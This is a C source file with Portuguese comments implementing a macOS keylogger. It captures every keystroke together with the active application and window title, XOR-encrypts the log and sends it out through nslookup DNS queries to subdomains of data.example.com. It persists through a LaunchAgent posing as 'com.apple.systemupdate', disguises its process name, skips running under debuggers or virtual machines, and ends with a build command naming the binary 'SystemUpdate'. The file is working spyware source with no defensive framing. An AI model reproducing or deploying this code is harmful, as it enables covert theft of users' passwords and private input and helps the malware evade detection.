#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach-o/dyld.h>
#include "../common/crypto.h"
#include "../common/stealth.h"

// Estrutura para eventos
typedef struct {
    CFAbsoluteTime timestamp;
    CGKeyCode keycode;
    int state; // press/release
    char app_name[256];
    char window_title[256];
} MacKeyEvent;

static CryptoBuffer g_buffer = {{0}, 0, {0}, 0};
static CFMachPortRef g_event_tap = NULL;
static CFRunLoopSourceRef g_run_loop_source = NULL;
static int g_running = 1;

// Callback para eventos de teclado
CGEventRef keyboard_callback(CGEventTapProxy proxy, CGEventType type, 
                           CGEventRef event, void* user_info) {
    if (type == kCGEventKeyDown || type == kCGEventKeyUp) {
        MacKeyEvent key_event = {0};
        key_event.timestamp = CFAbsoluteTimeGetCurrent();
        key_event.keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        key_event.state = (type == kCGEventKeyDown) ? 1 : 0;
        
        // Obter aplicação ativa
        ProcessSerialNumber psn;
        if (GetFrontProcess(&psn) == noErr) {
            CFStringRef app_name_ref = NULL;
            if (CopyProcessName(&psn, &app_name_ref) == noErr && app_name_ref) {
                CFStringGetCString(app_name_ref, key_event.app_name, 
                                 sizeof(key_event.app_name), kCFStringEncodingUTF8);
                CFRelease(app_name_ref);
            }
            
            // Tentar obter título da janela (limitado no macOS por segurança)
            pid_t pid;
            if (GetProcessPID(&psn, &pid) == noErr) {
                CFArrayRef window_list = CGWindowListCopyWindowInfo(
                    kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements,
                    kCGNullWindowID);
                
                if (window_list) {
                    CFIndex count = CFArrayGetCount(window_list);
                    for (CFIndex i = 0; i < count; i++) {
                        CFDictionaryRef window = CFArrayGetValueAtIndex(window_list, i);
                        CFNumberRef window_pid = CFDictionaryGetValue(window, kCGWindowOwnerPID);
                        
                        if (window_pid) {
                            pid_t w_pid;
                            CFNumberGetValue(window_pid, kCFNumberIntType, &w_pid);
                            
                            if (w_pid == pid) {
                                CFStringRef title = CFDictionaryGetValue(window, kCGWindowName);
                                if (title) {
                                    CFStringGetCString(title, key_event.window_title,
                                                     sizeof(key_event.window_title), 
                                                     kCFStringEncodingUTF8);
                                    break;
                                }
                            }
                        }
                    }
                    CFRelease(window_list);
                }
            }
        }
        
        // Criptografar e armazenar
        if (g_buffer.size + sizeof(MacKeyEvent) < sizeof(g_buffer.data)) {
            memcpy(g_buffer.data + g_buffer.size, &key_event, sizeof(MacKeyEvent));
            xor_encrypt(g_buffer.data + g_buffer.size, sizeof(MacKeyEvent), g_buffer.key, 32);
            g_buffer.size += sizeof(MacKeyEvent);
        }
        
        // Exfiltrar quando necessário
        if (g_buffer.size > 3500) {
            exfiltrate_via_dns_macos();
            g_buffer.size = 0;
        }
    }
    
    return event; // Passar evento adiante
}

// Exfiltração via DNS
void exfiltrate_via_dns_macos() {
    char encoded_data[1024] = {0};
    const char* b64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int j = 0;
    
    // Base64 encode
    for (int i = 0; i < g_buffer.size && j < 1000; i += 3) {
        uint32_t octet_a = i < g_buffer.size ? g_buffer.data[i] : 0;
        uint32_t octet_b = i + 1 < g_buffer.size ? g_buffer.data[i + 1] : 0;
        uint32_t octet_c = i + 2 < g_buffer.size ? g_buffer.data[i + 2] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        encoded_data[j++] = b64_chars[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = b64_chars[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = b64_chars[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = b64_chars[(triple >> 0 * 6) & 0x3F];
    }
    
    // Fragmentar em queries DNS
    for (int i = 0; i < j; i += 60) {
        char fragment[64] = {0};
        strncpy(fragment, encoded_data + i, 60);
        
        char dns_query[256];
        snprintf(dns_query, sizeof(dns_query), "%s.data.example.com", fragment);
        
        // Usar system() para resolver DNS
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "nslookup %s > /dev/null 2>&1", dns_query);
        system(cmd);
        
        usleep(100000); // 100ms delay
    }
}

// Persistência via LaunchAgent
void install_persistence() {
    char plist_path[512];
    char exe_path[512];
    
    // Obter caminho do executável
    uint32_t size = sizeof(exe_path);
    if (_NSGetExecutablePath(exe_path, &size) != 0) {
        return;
    }
    
    // Caminho do LaunchAgent
    snprintf(plist_path, sizeof(plist_path), 
             "%s/Library/LaunchAgents/com.apple.systemupdate.plist", 
             getenv("HOME"));
    
    FILE* f = fopen(plist_path, "w");
    if (f) {
        fprintf(f, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        fprintf(f, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ");
        fprintf(f, "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
        fprintf(f, "<plist version=\"1.0\">\n");
        fprintf(f, "<dict>\n");
        fprintf(f, "    <key>Label</key>\n");
        fprintf(f, "    <string>com.apple.systemupdate</string>\n");
        fprintf(f, "    <key>ProgramArguments</key>\n");
        fprintf(f, "    <array>\n");
        fprintf(f, "        <string>%s</string>\n", exe_path);
        fprintf(f, "    </array>\n");
        fprintf(f, "    <key>RunAtLoad</key>\n");
        fprintf(f, "    <true/>\n");
        fprintf(f, "    <key>KeepAlive</key>\n");
        fprintf(f, "    <true/>\n");
        fprintf(f, "</dict>\n");
        fprintf(f, "</plist>\n");
        fclose(f);
        
        // Carregar LaunchAgent
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "launchctl load %s", plist_path);
        system(cmd);
    }
}

// Esconder processo
void hide_process() {
    // Renomear processo para algo genérico
    extern char** environ;
    if (environ && environ[0]) {
        strcpy(environ[0], "com.apple.systemupdate");
    }
}

// Signal handler
void signal_handler(int sig) {
    g_running = 0;
    CFRunLoopStop(CFRunLoopGetCurrent());
}

// Verificar permissões de acessibilidade
bool check_accessibility_permissions() {
    // Tentar criar um event tap - falhará se não tiver permissões
    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef test_tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                            kCGEventTapOptionDefault, mask, 
                                            keyboard_callback, NULL);
    
    if (test_tap) {
        CFRelease(test_tap);
        return true;
    }
    
    return false;
}

int main(int argc, char* argv[]) {
    // Verificações anti-análise
    if (is_debugger_present() || is_virtual_machine()) {
        return 0;
    }
    
    anti_analysis_delay();
    
    // Verificar permissões de acessibilidade
    if (!check_accessibility_permissions()) {
        // Tentar solicitar permissões
        printf("Accessibility permissions required. Please grant access in System Preferences.\n");
        return 1;
    }
    
    // Esconder processo
    hide_process();
    
    // Instalar persistência
    install_persistence();
    
    // Inicializar criptografia
    generate_system_key(g_buffer.key, 32);
    
    // Setup signal handlers
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    
    // Criar event tap
    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp);
    g_event_tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                  kCGEventTapOptionDefault, mask, 
                                  keyboard_callback, NULL);
    
    if (!g_event_tap) {
        return 1;
    }
    
    // Criar run loop source
    g_run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, g_event_tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), g_run_loop_source, kCFRunLoopCommonModes);
    
    // Habilitar event tap
    CGEventTapEnable(g_event_tap, true);
    
    // Run loop principal
    CFRunLoopRun();
    
    // Cleanup
    if (g_run_loop_source) {
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), g_run_loop_source, kCFRunLoopCommonModes);
        CFRelease(g_run_loop_source);
    }
    
    if (g_event_tap) {
        CGEventTapEnable(g_event_tap, false);
        CFRelease(g_event_tap);
    }
    
    return 0;
}

// Compilar com: clang -O3 -framework CoreFoundation -framework CoreGraphics -framework ApplicationServices -framework Carbon -o SystemUpdate macos_stealth_monitor.c